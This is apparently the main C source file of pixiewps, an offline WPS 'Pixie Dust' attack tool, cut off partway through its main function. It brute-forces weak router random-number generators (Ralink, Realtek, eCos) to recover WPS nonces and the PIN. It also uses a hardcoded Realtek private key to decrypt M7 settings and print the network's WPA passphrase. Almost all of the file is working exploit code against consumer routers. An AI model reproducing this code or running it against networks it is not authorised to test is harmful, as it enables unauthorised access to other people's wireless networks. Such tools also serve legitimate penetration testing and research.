/*
 * pixiewps: offline WPS brute-force utility that exploits low entropy PRNGs
 *
 * Copyright (c) 2015-2017, wiire <wi7ire@gmail.com>
 * SPDX-License-Identifier: GPL-3.0+
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 */

#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <getopt.h>
#include <pthread.h>
#include <limits.h>
#include <assert.h>
#include <stdarg.h> /* libtommath.c */
#if defined(_WIN32) || defined(__WIN32__)
# include <windows.h>
#endif

#include <sys/types.h>
#include <sys/time.h>

#include "config.h"
#include "pixiewps.h"
#include "crypto/crypto_internal-modexp.c"
#include "crypto/aes-cbc.c"
#include "utils.h"
#include "wps.h"
#include "version.h"

#define GLIBC_MAX_GEN 4
#include "random/glibc_random.c"
#include "random/glibc_random_lazy.c"

uint32_t ecos_rand_simplest(uint32_t *seed);
uint32_t ecos_rand_simple(uint32_t *seed);
uint32_t ecos_rand_knuth(uint32_t *seed);

static int crack_first_half(struct global *wps, char *pin, const uint8_t *es1_override);
static int crack_second_half(struct global *wps, char *pin);
static int crack(struct global *wps, char *pin);

static const char *option_string = "e:r:s:z:a:n:m:b:o:v:j:5:7:SflVh?";
static const struct option long_options[] = {
	{ "pke",       required_argument, 0, 'e' },
	{ "pkr",       required_argument, 0, 'r' },
	{ "e-hash1",   required_argument, 0, 's' },
	{ "e-hash2",   required_argument, 0, 'z' },
	{ "authkey",   required_argument, 0, 'a' },
	{ "e-nonce",   required_argument, 0, 'n' },
	{ "r-nonce",   required_argument, 0, 'm' },
	{ "e-bssid",   required_argument, 0, 'b' },
	{ "output",    required_argument, 0, 'o' },
	{ "verbosity", required_argument, 0, 'v' },
	{ "jobs",      required_argument, 0, 'j' },
	{ "dh-small",  no_argument,       0, 'S' },
	{ "force",     no_argument,       0, 'f' },
	{ "length",    no_argument,       0, 'l' },
	{ "version",   no_argument,       0, 'V' },
	{ "help",      no_argument,       0,  0  },
	{ "mode",      required_argument, 0,  1  },
	{ "start",     required_argument, 0,  2  },
	{ "end",       required_argument, 0,  3  },
	{ "m5-enc",    required_argument, 0, '5' },
	{ "m7-enc",    required_argument, 0, '7' },
	{  0,          no_argument,       0, 'h' },
	{  0,          0,                 0,  0  }
};

#define SEEDS_PER_JOB_BLOCK 1000

struct crack_job {
	pthread_t thr;
	uint32_t start;
};

static struct job_control {
	int jobs;
	int mode;
	uint32_t end;
	uint32_t randr_enonce[4];
	struct global *wps;
	struct crack_job *crack_jobs;
	volatile uint32_t nonce_seed;
} job_control;

static void crack_thread_rtl(struct crack_job *j)
{
	struct glibc_lazyprng glibc_lazyprng;
	uint32_t seed = j->start;
	uint32_t limit = job_control.end;
	uint32_t tmp[4];

	while (!job_control.nonce_seed) {
		glibc_lazyseed(&glibc_lazyprng, seed);
		if (glibc_rand1(&glibc_lazyprng) == job_control.randr_enonce[0]) {
			if (!memcmp(glibc_randfill(&glibc_lazyprng, tmp), job_control.randr_enonce, WPS_NONCE_LEN)) {
				job_control.nonce_seed = seed;
				DEBUG_PRINT("Seed found %u", seed);
			}
		}

		if (seed == 0) break;

		seed--;

		if (seed < j->start - SEEDS_PER_JOB_BLOCK) {
			int64_t tmp = (int64_t)j->start - SEEDS_PER_JOB_BLOCK * job_control.jobs;
			if (tmp < 0) break;
			j->start = tmp;
			seed = j->start;
			if (seed < limit) break;
		}
	}
}

struct ralink_randstate {
	uint32_t sreg;
};

static unsigned char ralink_randbyte(struct ralink_randstate *state)
{
	unsigned char r = 0, result;

	if (state->sreg == 0) state->sreg = 1;

	for (int i = 0; i < 8; i++) {
		if (state->sreg & 0x00000001) {
			state->sreg = ((state->sreg ^ 0x80000057) >> 1) | 0x80000000;
			result = 1;
		}
		else {
			state->sreg = state->sreg >> 1;
			result = 0;
		}
		r = (r << 1) | result;
	}
	return r;
}

static int crack_rt(uint32_t start, uint32_t end, uint32_t *result)
{
	uint32_t seed;
	struct ralink_randstate prng;
	unsigned char testnonce[16] = {0};
	unsigned char *search_nonce = (void *)job_control.randr_enonce;

	for (seed = start; seed < end; seed++) {
		int i;
		prng.sreg = seed;
		testnonce[0] = ralink_randbyte(&prng);
		if (testnonce[0] != search_nonce[0]) continue;
		for (i = 1; i < 4; i++) testnonce[i] = ralink_randbyte(&prng);
		if (memcmp(testnonce, search_nonce, 4)) continue;
		for (i = 4; i < WPS_NONCE_LEN; i++) testnonce[i] = ralink_randbyte(&prng);
		if (!memcmp(testnonce, search_nonce, WPS_NONCE_LEN)) {
			*result = seed;
			return 1;
		}
	}
	return 0;
}

static void crack_thread_rt(struct crack_job *j)
{
	uint64_t tmp;
	uint32_t start = j->start, end;
	uint32_t res;

	while (!job_control.nonce_seed) {
		tmp = (uint64_t)start + (uint64_t)SEEDS_PER_JOB_BLOCK;
		if (tmp > (uint64_t)job_control.end) tmp =  job_control.end;
		end = tmp;

		if (crack_rt(start, end, &res)) {
			job_control.nonce_seed = res;
			DEBUG_PRINT("Seed found %u", (unsigned) res);
		}
		tmp = (uint64_t)start + (uint64_t)(SEEDS_PER_JOB_BLOCK * job_control.jobs);
		if (tmp > (uint64_t)job_control.end) break;
		start = tmp;
	}
}

static void crack_thread_rtl_es(struct crack_job *j);

static void *crack_thread(void *arg)
{
	struct crack_job *j = arg;

	if (job_control.mode == RTL819x)
		crack_thread_rtl(j);
	else if (job_control.mode == RT)
		crack_thread_rt(j);
	else if (job_control.mode == -RTL819x)
		crack_thread_rtl_es(j);
	else
		assert(0);

	return 0;
}

#ifndef PTHREAD_STACK_MIN
static void setup_thread(int i)
{
	pthread_create(&job_control.crack_jobs[i].thr, 0, crack_thread, &job_control.crack_jobs[i]);
}
#else
static size_t getminstacksize(size_t minimum)
{
	return (minimum < PTHREAD_STACK_MIN) ? PTHREAD_STACK_MIN : minimum;
}

static void setup_thread(int i)
{
	size_t stacksize = getminstacksize(64 * 1024);
	pthread_attr_t attr;
	int attr_ok = pthread_attr_init(&attr) == 0 ;
	if (attr_ok) pthread_attr_setstacksize(&attr, stacksize);
	pthread_create(&job_control.crack_jobs[i].thr, &attr, crack_thread, &job_control.crack_jobs[i]);
	if (attr_ok) pthread_attr_destroy(&attr);
}
#endif

static void init_crack_jobs(struct global *wps, int mode)
{
	job_control.wps = wps;
	job_control.jobs = wps->jobs;
	job_control.end = (mode == RTL819x) ? wps->end : 0xffffffffu;
	job_control.mode = mode;
	job_control.nonce_seed = 0;
	memset(job_control.randr_enonce, 0, sizeof(job_control.randr_enonce));

	/* Converting enrollee nonce to the sequence may be generated by current random function */
	int i, j = 0;
	if (mode == -RTL819x) ; /* nuffin' */
	else if (mode == RTL819x)
		for (i = 0; i < 4; i++) {
			job_control.randr_enonce[i] |= wps->e_nonce[j++];
			job_control.randr_enonce[i] <<= 8;
			job_control.randr_enonce[i] |= wps->e_nonce[j++];
			job_control.randr_enonce[i] <<= 8;
			job_control.randr_enonce[i] |= wps->e_nonce[j++];
			job_control.randr_enonce[i] <<= 8;
			job_control.randr_enonce[i] |= wps->e_nonce[j++];
		}
	else
		memcpy(job_control.randr_enonce, wps->e_nonce, WPS_NONCE_LEN);

	job_control.crack_jobs = malloc(wps->jobs * sizeof (struct crack_job));
	uint32_t curr = (mode == RTL819x) ? wps->start : 0;
	int32_t add = (mode == RTL819x) ? -SEEDS_PER_JOB_BLOCK : SEEDS_PER_JOB_BLOCK;
	for (i = 0; i < wps->jobs; i++) {
		job_control.crack_jobs[i].start = (mode == -RTL819x) ? i + 1 : curr;
		setup_thread(i);
		curr += add;
	}
}

static uint32_t collect_crack_jobs()
{
	for (int i = 0; i < job_control.jobs; i++) {
		void *ret;
		pthread_join(job_control.crack_jobs[i].thr, &ret);
	}
	free(job_control.crack_jobs);
	return job_control.nonce_seed;
}

unsigned int hardware_concurrency()
{
#if defined(PTW32_VERSION) || defined(__hpux)
	return pthread_num_processors_np();
#elif defined(__APPLE__) || defined(__FreeBSD__)
	int count;
	size_t size = sizeof(count);
	return sysctlbyname("hw.ncpu", &count, &size, NULL, 0) ? 0 : count;
#elif defined(_SC_NPROCESSORS_ONLN) /* unistd.h */
	int const count = sysconf(_SC_NPROCESSORS_ONLN);
	return (count > 0) ? count : 0;
#elif defined(__GLIBC__)
	return get_nprocs();
#elif defined(_WIN32) || defined(__WIN32__)
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	return sysinfo.dwNumberOfProcessors;
#else
	return 0;
#endif
}

static void rtl_nonce_fill(uint8_t *nonce, uint32_t seed)
{
	struct glibc_prng glibc_prng;
	int i;
	uint8_t *ptr = nonce;

	glibc_seed(&glibc_prng, seed);

	for (i = 0; i < 4; i++, ptr += 4) {
		uint32_t be = end_htobe32(glibc_rand(&glibc_prng));
		memcpy(ptr, &be, sizeof be);
	}
}

static int find_rtl_es1(struct global *wps, char *pin, uint8_t *nonce_buf, uint32_t seed)
{
	rtl_nonce_fill(nonce_buf, seed);

	return crack_first_half(wps, pin, nonce_buf);
}


static void crack_thread_rtl_es(struct crack_job *j)
{
	int thread_id = j->start;
	uint8_t nonce_buf[WPS_SECRET_NONCE_LEN];
	char pin[WPS_PIN_LEN + 1];
	int dist, max_dist = (MODE3_TRIES + 1);

	for (dist = thread_id; !job_control.nonce_seed && dist < max_dist; dist += job_control.jobs) {
		if (find_rtl_es1(job_control.wps, pin, nonce_buf, job_control.wps->nonce_seed + dist)) {
			job_control.nonce_seed = job_control.wps->nonce_seed + dist;
			memcpy(job_control.wps->e_s1, nonce_buf, sizeof nonce_buf);
			memcpy(job_control.wps->pin, pin, sizeof pin);
		}

		if (job_control.nonce_seed)
			break;

		if (find_rtl_es1(job_control.wps, pin, nonce_buf, job_control.wps->nonce_seed - dist)) {
			job_control.nonce_seed = job_control.wps->nonce_seed - dist;
			memcpy(job_control.wps->e_s1, nonce_buf, sizeof nonce_buf);
			memcpy(job_control.wps->pin, pin, sizeof pin);
		}
	}
}

static int find_rtl_es(struct global *wps)
{

	init_crack_jobs(wps, -RTL819x);

	/* checking distance 0 in the main thread, as it is the most likely */
	uint8_t nonce_buf[WPS_SECRET_NONCE_LEN];
	char pin[WPS_PIN_LEN + 1];

	if (find_rtl_es1(wps, pin, nonce_buf, wps->nonce_seed)) {
		job_control.nonce_seed = wps->nonce_seed;
		memcpy(wps->e_s1, nonce_buf, sizeof nonce_buf);
		memcpy(wps->pin, pin, sizeof pin);
	}

	collect_crack_jobs();

	if (job_control.nonce_seed) {
		DEBUG_PRINT("First pin half found");
		wps->s1_seed = job_control.nonce_seed;
		char pin_copy[WPS_PIN_LEN + 1];
		strcpy(pin_copy, wps->pin);
		int j;
		/* we assume that the seed used for es2 is within a range of 10 seconds
		   forwards in time only */
		for (j = 0; j < 10; j++) {
			strcpy(wps->pin, pin_copy);
			rtl_nonce_fill(wps->e_s2, wps->s1_seed + j);
			DEBUG_PRINT("Trying (%10u) with E-S2: ", wps->s1_seed + j);
			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
			if (crack_second_half(wps, wps->pin)) {
				wps->s2_seed = wps->s1_seed + j;
				DEBUG_PRINT("Pin found");
				return RTL819x;
			}
		}
	}
	return NONE;
}

static void empty_pin_hmac(struct global *wps)
{
	/* since the empty pin psk is static once initialized, we calculate it only once */
	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, NULL, 0, wps->empty_psk);
}

int main(int argc, char **argv)
{
	struct global *wps;
	if ((wps = calloc(1, sizeof(struct global)))) {
		unsigned int cores = hardware_concurrency();
		wps->jobs = cores == 0 ? 1 : cores;
		wps->mode_auto = 1;
		wps->verbosity = 3;
		wps->error = calloc(256, 1);
		if (!wps->error)
			goto memory_err;
		wps->error[0] = '\n';
	}
	else {

memory_err:
		fprintf(stderr, "\n [X] Memory allocation error!\n");
		return MEM_ERROR;
	}

	time_t start_p = (time_t) -1, end_p = (time_t) -1;
	struct timeval t_start, t_end;

	int opt = 0;
	int long_index = 0;
	uint_fast8_t c = 0;
	opt = getopt_long(argc, argv, option_string, long_options, &long_index);
	while (opt != -1) {
		c++;
		switch (opt) {
			case 'j':
				if (get_int(optarg, &wps->jobs) != 0 || wps->jobs < 1) {
					snprintf(wps->error, 256, "\n [!] Bad number of jobs -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'e':
				wps->pke = malloc(WPS_PKEY_LEN);
				if (!wps->pke)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->pke, WPS_PKEY_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad enrollee public key -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'r':
				wps->pkr = malloc(WPS_PKEY_LEN);
				if (!wps->pkr)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->pkr, WPS_PKEY_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad registrar public key -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 's':
				wps->e_hash1 = malloc(WPS_HASH_LEN);
				if (!wps->e_hash1)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_hash1, WPS_HASH_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad hash -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'z':
				wps->e_hash2 = malloc(WPS_HASH_LEN);
				if (!wps->e_hash2)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_hash2, WPS_HASH_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad hash -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'a':
				wps->authkey = malloc(WPS_AUTHKEY_LEN);
				if (!wps->authkey)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->authkey, WPS_HASH_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad authentication session key -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'n':
				wps->e_nonce = malloc(WPS_NONCE_LEN);
				if (!wps->e_nonce)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_nonce, WPS_NONCE_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad enrollee nonce -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'm':
				wps->r_nonce = malloc(WPS_NONCE_LEN);
				if (!wps->r_nonce)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->r_nonce, WPS_NONCE_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad registrar nonce -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'b':
				wps->e_bssid = malloc(WPS_BSSID_LEN);
				if (!wps->e_bssid)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_bssid, WPS_BSSID_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad enrollee MAC address -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'S':
				wps->small_dh_keys = 1;
				break;
			case 'f':
				wps->bruteforce = 1;
				break;
			case 'l':
				wps->anylength = 1;
				break;
			case 'o':
				if (!freopen(optarg, "w", stdout)) {
					snprintf(wps->error, 256, "\n [!] Failed to open file for writing -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'v':
				if (get_int(optarg, &wps->verbosity) != 0 || wps->verbosity < 1 || wps->verbosity > 3) {
					snprintf(wps->error, 256, "\n [!] Bad verbosity level -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'V':
				if (c > 1) { /* If --version is used then no other argument should be supplied */
					snprintf(wps->error, 256, "\n [!] Bad use of argument --version (-V)!\n\n");
					goto usage_err;
				}
				else {
					unsigned int cores = hardware_concurrency();
					struct timeval t_current;
					gettimeofday(&t_current, 0);
					time_t r_time;
					struct tm ts;
					char buffer[30];
					r_time = t_current.tv_sec;
					ts = *gmtime(&r_time);
					strftime(buffer, 30, "%c", &ts);
					fprintf(stderr, "\n ");
					printf("Pixiewps %s", LONG_VERSION); fflush(stdout);
					fprintf(stderr, "\n\n"
							" [*] System time: %lu (%s UTC)\n"
							" [*] Number of cores available: %u\n\n",
							(unsigned long) t_current.tv_sec, buffer, cores == 0 ? 1 : cores);
					free(wps->error);
					free(wps);
					return ARG_ERROR;
				}
			case 'h':
				goto usage_err;
				break;
			case  0 :
				if (!strcmp("help", long_options[long_index].name)) {
					fprintf(stderr, v_usage, SHORT_VERSION,
						p_mode_name[RT],
						p_mode_name[ECOS_SIMPLE],
						p_mode_name[RTL819x],
						p_mode_name[ECOS_SIMPLEST],
						p_mode_name[ECOS_KNUTH]
					);
					free(wps->error);
					free(wps);
					return ARG_ERROR;
				}
				goto usage_err;
			case  1 :
				if (!strcmp("mode", long_options[long_index].name)) {
					if (parse_mode(optarg, p_mode, MODE_LEN)) {
						snprintf(wps->error, 256, "\n [!] Bad modes -- %s\n\n", optarg);
						goto usage_err;
					}
					wps->mode_auto = 0;
					break;
				}
				goto usage_err;
			case  2 :
				if (!strcmp("start", long_options[long_index].name)) {
					if (get_unix_datetime(optarg, &(start_p))) {
						snprintf(wps->error, 256, "\n [!] Bad starting point -- %s\n\n", optarg);
						goto usage_err;
					}
					break;
				}
				goto usage_err;
			case  3 :
				if (!strcmp("end", long_options[long_index].name)) {
					if (get_unix_datetime(optarg, &(end_p))) {
						snprintf(wps->error, 256, "\n [!] Bad ending point -- %s\n\n", optarg);
						goto usage_err;
					}
					break;
				}
				goto usage_err;
			case '5':
				wps->m5_encr = malloc(ENC_SETTINGS_LEN);
				if (!wps->m5_encr)
					goto memory_err;
				if (hex_string_to_byte_array_max(optarg, wps->m5_encr, ENC_SETTINGS_LEN, &wps->m5_encr_len)) {
					snprintf(wps->error, 256, "\n [!] Bad m5 encrypted settings -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case '7':
				wps->m7_encr = malloc(ENC_SETTINGS_LEN);
				if (!wps->m7_encr)
					goto memory_err;
				if (hex_string_to_byte_array_max(optarg, wps->m7_encr, ENC_SETTINGS_LEN, &wps->m7_encr_len)) {
					snprintf(wps->error, 256, "\n [!] Bad m7 encrypted settings -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case '?':
			default:
				fprintf(stderr, "Run %s -h for help.\n", argv[0]);
				free(wps->error);
				free(wps);
				return ARG_ERROR;
		}
		opt = getopt_long(argc, argv, option_string, long_options, &long_index);
	}

	if (argc - optind != 0) {
		snprintf(wps->error, 256, "\n [!] Unknown extra argument(s)!\n\n");
		goto usage_err;
	}
	else {
		if (!c) {

usage_err:
			fprintf(stderr, usage, SHORT_VERSION, argv[0], wps->error);

			free(wps->pke);
			free(wps->pkr);
			free(wps->e_hash1);
			free(wps->e_hash2);
			free(wps->authkey);
			free(wps->e_nonce);
			free(wps->r_nonce);
			free(wps->e_bssid);
			free(wps->error);
			free(wps);

			return ARG_ERROR;
		}
	}

	/* Mode 3 is enforced to make users aware this option is currently only available for RTL819x */
	if (wps->m7_encr) {
		if (!wps->pke || !wps->pkr || !wps->e_nonce || !wps->r_nonce || !wps->e_bssid || !is_mode_selected(RTL819x)) {
			snprintf(wps->error, 256, "\n [!] Must specify --pke, --pkr, --e-nonce, --r-nonce, --bssid and --mode 3!\n\n");
			goto usage_err;
		}
		if (memcmp(wps->pke, wps_rtl_pke, WPS_PKEY_LEN)) {
			printf("\n Pixiewps %s\n", SHORT_VERSION);
			printf("\n [-] Model not supported!\n\n");
			return UNS_ERROR;
		}
		wps->e_key = malloc(WPS_PKEY_LEN);
		if (!wps->e_key)
			goto memory_err;
		SET_RTL_PRIV_KEY(wps->e_key);

		size_t pkey_len = WPS_PKEY_LEN;
		uint8_t *buffer = malloc(WPS_PKEY_LEN);
		if (!buffer)
			goto memory_err;

		wps->dhkey   = malloc(WPS_HASH_LEN);       if (!wps->dhkey)   goto memory_err;
		wps->kdk     = malloc(WPS_HASH_LEN);       if (!wps->kdk)     goto memory_err;
		wps->authkey = malloc(WPS_AUTHKEY_LEN);    if (!wps->authkey) goto memory_err;
		wps->wrapkey = malloc(WPS_KEYWRAPKEY_LEN); if (!wps->wrapkey) goto memory_err;
		wps->emsk    = malloc(WPS_EMSK_LEN);       if (!wps->emsk)    goto memory_err;

		gettimeofday(&t_start, 0);

		/* DHKey = SHA-256(g^(AB) mod p) = SHA-256(PKe^A mod p) = SHA-256(PKr^B mod p) */
		crypto_mod_exp(wps->pkr, WPS_PKEY_LEN, wps->e_key, WPS_PKEY_LEN, dh_group5_prime, WPS_PKEY_LEN, buffer, &pkey_len);
		sha256(buffer, WPS_PKEY_LEN, wps->dhkey);
		free(wps->e_key);

		memcpy(buffer, wps->e_nonce, WPS_NONCE_LEN);
		memcpy(buffer + WPS_NONCE_LEN, wps->e_bssid, WPS_BSSID_LEN);
		memcpy(buffer + WPS_NONCE_LEN + WPS_BSSID_LEN, wps->r_nonce, WPS_NONCE_LEN);

		/* KDK = HMAC-SHA-256{DHKey}(Enrollee nonce || Enrollee MAC || Registrar nonce) */
		hmac_sha256(wps->dhkey, WPS_HASH_LEN, buffer, WPS_NONCE_LEN * 2 + WPS_BSSID_LEN, wps->kdk);

		/* Key derivation function */
		kdf(wps->kdk, buffer);
		memcpy(wps->authkey, buffer, WPS_AUTHKEY_LEN);
		memcpy(wps->wrapkey, buffer + WPS_AUTHKEY_LEN, WPS_KEYWRAPKEY_LEN);
		memcpy(wps->emsk, buffer + WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN, WPS_EMSK_LEN);

		/* Decrypt encrypted settings */
		uint8_t *decrypted7 = decrypt_encr_settings(wps->wrapkey, wps->m7_encr, wps->m7_encr_len);
		free(wps->m7_encr);
		if (!decrypted7) {
			printf("\n Pixiewps %s\n", SHORT_VERSION);
			printf("\n [x] Unexpected error while decrypting (--m7-enc)!\n\n");
			return UNS_ERROR;
		}

		uint8_t *decrypted5 = NULL;
		if (wps->m5_encr) {
			decrypted5 = decrypt_encr_settings(wps->wrapkey, wps->m5_encr, wps->m5_encr_len);
			free(wps->m5_encr);
			if (!decrypted5) {
				printf("\n Pixiewps %s\n", SHORT_VERSION);
				printf("\n [x] Unexpected error while decrypting (--m5-enc)!\n\n");
				return UNS_ERROR;
			}
		}

		uint_fast8_t pfound = PIN_ERROR;
		vtag_t *vtag;
		if (decrypted5 && decrypted7 && wps->e_hash1 && wps->e_hash2) {
			wps->e_s1 = malloc(WPS_SECRET_NONCE_LEN); if (!wps->e_s1) goto memory_err;
			wps->e_s2 = malloc(WPS_SECRET_NONCE_LEN); if (!wps->e_s2) goto memory_err;
			wps->psk1 = malloc(WPS_HASH_LEN);         if (!wps->psk1) goto memory_err;
			wps->psk2 = malloc(WPS_HASH_LEN);         if (!wps->psk2) goto memory_err;
			if ((vtag = find_vtag(decrypted5, wps->m5_encr_len - 16, WPS_TAG_E_SNONCE_1, WPS_NONCE_LEN))) {
				memcpy(wps->e_s1, vtag->data, WPS_NONCE_LEN);
			}
			else {
				printf("\n Pixiewps %s\n", SHORT_VERSION);
				printf("\n [x] Unexpected error (--m5-enc)!\n\n");
				return UNS_ERROR;
			}
			if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_E_SNONCE_2, WPS_NONCE_LEN))) {
				memcpy(wps->e_s2, vtag->data, WPS_NONCE_LEN);
			}
			else {
				printf("\n Pixiewps %s\n", SHORT_VERSION);
				printf("\n [x] Unexpected error (--m7-enc)!\n\n");
				return UNS_ERROR;
			}

			pfound = crack(wps, wps->pin);
		}

		gettimeofday(&t_end, 0);
		unsigned long ms_elapsed = get_elapsed_ms(&t_start, &t_end);

		printf("\n Pixiewps %s\n", SHORT_VERSION);
		if (wps->verbosity > 1) {
			printf("\n [?] Mode:     %d (%s)", RTL819x, p_mode_name[RTL819x]);
		}
		if (wps->verbosity > 2) {
			printf("\n [*] DHKey:    "); byte_array_print(wps->dhkey, WPS_HASH_LEN);
			printf("\n [*] KDK:      "); byte_array_print(wps->kdk, WPS_HASH_LEN);
			printf("\n [*] AuthKey:  "); byte_array_print(wps->authkey, WPS_AUTHKEY_LEN);
			printf("\n [*] EMSK:     "); byte_array_print(wps->emsk, WPS_EMSK_LEN);
			printf("\n [*] KWKey:    "); byte_array_print(wps->wrapkey, WPS_KEYWRAPKEY_LEN);
			if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_KEYWRAP_AUTH, WPS_TAG_KEYWRAP_AUTH_LEN))) {
				memcpy(buffer, vtag->data, WPS_TAG_KEYWRAP_AUTH_LEN);
				printf("\n [*] KWA:      "); byte_array_print(buffer, WPS_TAG_KEYWRAP_AUTH_LEN);
			}
			if (pfound == PIN_FOUND) {
				printf("\n [*] PSK1:     "); byte_array_print(wps->psk1, WPS_PSK_LEN);
				printf("\n [*] PSK2:     "); byte_array_print(wps->psk2, WPS_PSK_LEN);
			}
		}
		if (wps->verbosity > 1) {
			if (decrypted5) {
				if ((vtag = find_vtag(decrypted5, wps->m5_encr_len - 16, WPS_TAG_E_SNONCE_1, WPS_NONCE_LEN)))
					printf("\n [*] ES1:      "); byte_array_print(vtag->data, WPS_NONCE_LEN);
			}
			if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_E_SNONCE_2, WPS_NONCE_LEN)))
				printf("\n [*] ES2:      "); byte_array_print(vtag->data, WPS_NONCE_LEN);
		}
		if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_SSID, 0))) {
			int tag_size = end_ntoh16(vtag->len);
			memcpy(buffer, vtag->data, tag_size);
			buffer[tag_size] = '\0';
			printf("\n [*] SSID:     %s", buffer);
		}
		if (pfound == PIN_FOUND) {
			if (wps->pin[0] == '\0')
				printf("\n [+] WPS pin:  <empty>");
			else
				printf("\n [+] WPS pin:  %s", wps->pin);
		}
		if ((vtag = find_vtag(decrypted7, wps->m7_encr_len - 16, WPS_TAG_NET_KEY, 0))) {
			int tag_size = end_ntoh16(vtag->len);
			memcpy(buffer, vtag->data, tag_size);
			buffer[tag_size] = '\0';
			printf("\n [+] WPA-PSK:  %s", buffer);
		}
		else {
			printf("\n [-] WPA-PSK not found!");
		}

		printf("\n\n [*] Time taken: %lu s %lu ms\n\n", ms_elapsed / 1000, ms_elapsed % 1000);

		if (decrypted5) {
			free(decrypted5);
			if (wps->e_hash1 && wps->e_hash2) {
				free(wps->e_hash1);
				free(wps->e_hash2);
				free(wps->e_s1);
				free(wps->e_s2);
				free(wps->psk1);
				free(wps->psk2);
			}
		}

		free(decrypted7);
		free(buffer);
		free(wps->pke);
		free(wps->pkr);
		free(wps->e_nonce);
		free(wps->r_nonce);
		free(wps->e_bssid);
		free(wps->dhkey);
		free(wps->kdk);
		free(wps->authkey);
		free(wps->wrapkey);
		free(wps->emsk);
		free(wps->error);
		free(wps);

		return 0;
	}

	/* Not all required arguments have been supplied */
	if (wps->pke == 0 || wps->e_hash1 == 0 || wps->e_hash2 == 0 || wps->e_nonce == 0) {
		snprintf(wps->error, 256, "\n [!] Not all required arguments have been supplied!\n\n");
		goto usage_err;
	}

	/* If --dh-small is selected then no --pkr should be supplied */
	if (wps->pkr && wps->small_dh_keys) {
		snprintf(wps->error, 256, "\n [!] Options --dh-small and --pkr are mutually exclusive!\n\n");
		goto usage_err;
	}

	/* Either --pkr or --dh-small must be specified */
	if (!wps->pkr && !wps->small_dh_keys) {
		snprintf(wps->error, 256, "\n [!] Either --pkr or --dh-small must be specified!\n\n");
		goto usage_err;
	}

	/* Cannot specify --start or --end if --force is selected */
	if (wps->bruteforce && ((start_p != (time_t) -1) || (end_p != (time_t) -1))) {
		snprintf(wps->error, 256, "\n [!] Cannot specify --start or --end if --force is selected!\n\n");
		goto usage_err;
	}

	if (wps->mode_auto) { /* Mode auto, order by probability */
		if (!memcmp(wps->pke, wps_rtl_pke, WPS_PKEY_LEN)) {
			p_mode[0] = RTL819x;
			p_mode[1] = NONE;
		}
		else {
			p_mode[0] = RT;
			if (wps->pke && (!(wps->e_nonce[0] & 0x80) && !(wps->e_nonce[4]  & 0x80) &&
					!(wps->e_nonce[8] & 0x80) && !(wps->e_nonce[12] & 0x80))) {
				p_mode[1] = RTL819x;
				p_mode[2] = ECOS_SIMPLE;
				p_mode[3] = NONE;
			}
			else {
				p_mode[1] = ECOS_SIMPLE;
				p_mode[2] = NONE;
			}
		}
	}

	DEBUG_PRINT("Debugging enabled");
	DEBUG_PRINT("Modes: %d (%s), %d (%s), %d (%s), %d (%s), %d (%s)",
		p_mode[0], p_mode_name[p_mode[0]],
		p_mode[1], p_mode_name[p_mode[1]],
		p_mode[2], p_mode_name[p_mode[2]],
		p_mode[3], p_mode_name[p_mode[3]],
		p_mode[4], p_mode_name[p_mode[4]]
	);

	gettimeofday(&t_start, 0);

	if (is_mode_selected(RTL819x)) { /* Ignore --start and --end otherwise */

		wps->start = t_start.tv_sec + SEC_PER_DAY; /* Extra 1 day */
		wps->end = t_start.tv_sec - MODE3_DAYS * SEC_PER_DAY;

		/* Attributes --start and --end can be switched start > end or end > start */
		if (start_p != (time_t) -1) {
			if (end_p != (time_t) -1) {

				/* Attributes --start and --end must be different */
				if (start_p == end_p) {
					snprintf(wps->error, 256, "\n [!] Starting and Ending points must be different!\n\n");
					goto usage_err;
				}
				if (end_p > start_p) {
					wps->start = end_p;
					wps->end = start_p;
				}
				else {
					wps->start = start_p;
					wps->end = end_p;
				}
			}
			else {
				if (start_p >= wps->start) {
					snprintf(wps->error, 256, "\n [!] Bad Starting point!\n\n");
					goto usage_err;
				}
				else {
